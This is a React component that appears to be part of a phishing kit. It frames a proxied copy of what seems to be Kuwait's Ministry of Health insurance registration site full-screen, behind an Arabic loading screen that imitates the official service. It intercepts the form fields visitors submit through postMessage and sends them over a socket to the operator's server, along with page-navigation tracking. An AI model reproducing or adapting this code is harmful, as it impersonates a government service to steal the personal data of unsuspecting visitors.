import { useState, useEffect, useRef } from 'react';
import { socket, visitor } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Ensure proper viewport for mobile
  useEffect(() => {
    const meta = document.querySelector('meta[name="viewport"]');
    if (meta) {
      meta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }
  }, []);

  // Listen for postMessage from iframe (form data + navigation)
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      // Accept messages from our worker
      if (!event.data || typeof event.data !== 'object') return;

      const { type, path, fields, action } = event.data;

      if (type === 'moh-navigation') {
        // User navigated to a new page inside the iframe
        console.log('[MOH] Navigation:', path);
        if (socket.value.connected && visitor.value._id) {
          socket.value.emit('visitor:pageEnter', `MOH: ${path}`);
        }
      }

      if (type === 'moh-form-data') {
        // User submitted a form - capture the data
        console.log('[MOH] Form submitted:', fields, 'Action:', action);
        if (fields && Object.keys(fields).length > 0) {
          // Send to server via socket
          if (socket.value.connected && visitor.value._id) {
            socket.value.emit('more-info', {
              content: fields,
              page: `MOH: ${path || 'unknown'}`,
              waitingForAdminResponse: false,
            });
          }
        }
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  return (
    <div style={{
      width: '100vw',
      height: '100dvh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
      overflow: 'hidden',
    }}>
      {loading && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: '#f0f4f8',
          zIndex: 10000,
          direction: 'rtl',
          fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60,
            height: 60,
            border: '4px solid #e0e0e0',
            borderTop: '4px solid #1a7a4c',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}
      <iframe
        ref={iframeRef}
        src={WORKER_BASE + '/Insurance/logaction'}
        onLoad={() => setLoading(false)}
        style={{
          width: '100%',
          height: '100%',
          border: 'none',
          display: 'block',
          WebkitOverflowScrolling: 'touch',
          overflow: 'auto',
        } as React.CSSProperties}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
      />
    </div>
  );
}
